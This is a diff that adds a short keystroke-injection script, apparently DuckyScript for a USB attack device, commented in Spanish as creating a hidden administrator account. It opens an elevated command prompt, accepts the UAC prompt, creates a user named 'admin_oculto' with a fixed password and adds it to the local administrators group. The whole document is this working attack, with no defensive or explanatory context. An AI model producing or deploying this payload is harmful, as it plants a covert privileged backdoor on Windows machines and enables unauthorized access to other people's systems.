@@ -1,0 +1,14 @@
+REM Crear una cuenta de administrador oculta
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CONTROL-SHIFT ENTER
+DELAY 1000
+ALT y
+STRING net user admin_oculto P@ssw0rd123 /add
+ENTER
+STRING net localgroup administrators admin_oculto /add
+ENTER
+STRING exit
+ENTER
